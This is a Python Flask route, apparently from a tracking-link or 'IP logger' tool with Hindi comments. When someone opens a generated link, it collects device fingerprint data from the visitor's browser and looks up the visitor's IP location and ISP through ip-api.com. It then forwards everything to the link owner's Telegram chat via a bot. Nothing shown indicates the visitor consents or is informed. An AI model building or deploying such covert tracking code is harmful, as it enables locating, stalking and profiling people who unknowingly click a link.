@app.route('/device_info/<unique_id>', methods=['POST'])
def device_info(unique_id):
    if unique_id not in link_data:
        return {"status": "error"}, 400
    owner_id = link_data[unique_id]["owner"]
    data = request.get_json()
    if not data:
        return {"status": "error"}, 400

    # IP से लोकेशन लें (विज़िटर का IP)
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ip_city = "N/A"
    ip_region = "N/A"
    ip_country = "N/A"
    ip_isp = "N/A"
    try:
        resp = requests.get(f"http://ip-api.com/json/{visitor_ip}?fields=city,region,country,isp,query")
        if resp.status_code == 200:
            geo = resp.json()
            if geo.get("status") != "fail":
                ip_city = geo.get('city', 'N/A')
                ip_region = geo.get('region', 'N/A')
                ip_country = geo.get('country', 'N/A')
                ip_isp = geo.get('isp', 'N/A')
    except:
        pass

    # डिवाइस इन्फो मैसेज बनाएँ (अब IP लोकेशन भी शामिल)
    msg = "📱 Device Info:\n"
    msg += f"Browser/OS: {data.get('userAgent', 'N/A')}\n"
    msg += f"Platform: {data.get('platform', 'N/A')}\n"
    msg += f"Language: {data.get('language', 'N/A')}\n"
    msg += f"Screen: {data.get('screenWidth')}x{data.get('screenHeight')} ({data.get('colorDepth')}bit)\n"
    msg += f"Timezone: {data.get('timezone', 'N/A')}\n"
    msg += f"CPU Cores: {data.get('hardwareConcurrency', 'N/A')}\n"
    msg += f"Memory: {data.get('deviceMemory', 'N/A')} GB\n"
    msg += f"Battery: {data.get('batteryLevel', 'N/A')}% (Charging: {data.get('batteryCharging', 'N/A')})\n"
    msg += f"Network: {data.get('networkType', 'N/A')}\n"
    msg += f"Touch: {data.get('hasTouch', 'N/A')}\n"
    # अब IP लोकेशन डालें
    msg += f"--- IP Location ---\n"
    msg += f"City: {ip_city}\n"
    msg += f"Region: {ip_region}\n"
    msg += f"Country: {ip_country}\n"
    msg += f"ISP: {ip_isp}"

    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                  json={'chat_id': owner_id, 'text': msg})
    return {"status": "ok"}, 200
